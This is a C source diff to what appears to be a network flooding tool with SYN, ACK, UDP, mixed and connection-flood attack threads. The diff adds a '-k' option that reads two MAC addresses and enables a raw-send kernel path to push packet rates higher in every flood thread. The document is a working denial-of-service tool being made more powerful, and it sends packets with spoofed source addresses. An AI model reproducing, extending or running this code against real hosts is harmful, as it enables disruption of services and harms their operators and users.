@@ -51,6 +51,9 @@ int drop_time = -1;
 int use_tcp_options = 0;
 int fill_data_with_random = 0;
 int pps_output = 0;
+uint8_t src_mac[6];
+uint8_t dest_mac[6];
+int rawsendto = 0;
 
 uint8_t *get_send_data()
 {
@@ -94,6 +97,16 @@ uint16_t get_dest_syn_port()
     return dest_port;
 }
 
+void read_macaddr(uint8_t dest[6], const char *str)
+{
+    unsigned int tmp[6];
+    sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
+           &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
+    int i;
+    for(i=0;i<6;++i)
+        dest[i] = (uint8_t)tmp[i];
+}
+
 void recalculate_sleep_interval(int pps) {
     if(pps == 0 || pps_output == 0)
         return;
@@ -115,6 +128,9 @@ void *conn_flood_attack_thread(void *param)
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
         return NULL;
+
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     uint16_t src_port = leef_random_src_port();
     uint16_t id;
@@ -155,6 +171,9 @@ void conn_flood_sniff_thread()
     struct leef_handle leef;
     if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
         return;
+
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
     leef_set_sniff_packet_size(&leef, 64);
 
     uint16_t src_port;
@@ -552,6 +571,9 @@ void *syn_flood_attack_thread(void *param)
     if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
+
     while(running) {
         leef_send_tcp_syn(&leef,
                           get_src_ip(), dest_addr,
@@ -573,6 +595,9 @@ void *ack_flood_attack_thread(void *param)
     if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
+
     while(running) {
         leef_send_tcp_ack(&leef,
                           get_src_ip(), dest_addr,
@@ -592,6 +617,9 @@ void *udp_flood_attack_thread(void *param)
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
         return NULL;
+
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     while(running) {
         leef_send_udp_data(&leef,
@@ -613,6 +641,9 @@ void *mix_flood_attack_thread(void *param)
     struct leef_handle leef;
     if(!leef_init(&leef, interface, INJECTING))
         return NULL;
+
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
 
     while(running) {
         switch(leef_rand() % 4) {
@@ -699,6 +730,9 @@ void *pa_flood_attack_thread(void *param)
     if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
+
     while(running) {
         leef_send_raw_tcp2(&leef,
                         get_src_ip(), dest_addr,
@@ -720,6 +754,10 @@ void *tcp_ping_thread(void *param)
     struct leef_handle leef;
     if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
         return NULL;
+
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
+
     leef_set_sniff_packet_size(&leef, 128);
 
     leef_sniffed_packet packet;
@@ -864,6 +902,7 @@ void print_help(char **argv)
     printf("  -q                - Quiet, don't print statistics output\n");
     printf("  -x                - Drop established connections when receive ACK packets\n");
     printf("  -y [delay]        - Drop established connections after delay\n");
+    printf("  -k [smac] [dmac]  - Use rawsendto kernel patch to send massive kpps\n");
     printf("  --help            - Print this help\n");
 }
 
@@ -1051,6 +1090,11 @@ int main(int argc, char **argv)
                     break;
                 case 'y':
                     drop_time = atoi(argv[++arg]);
+                    break;
+                case 'k':
+                    read_macaddr(src_mac, argv[++arg]);
+                    read_macaddr(dest_mac, argv[++arg]);
+                    rawsendto = 1;
                     break;
                 default:
                     fprintf(stderr, "incorrect option %s, see --help\n", opt);
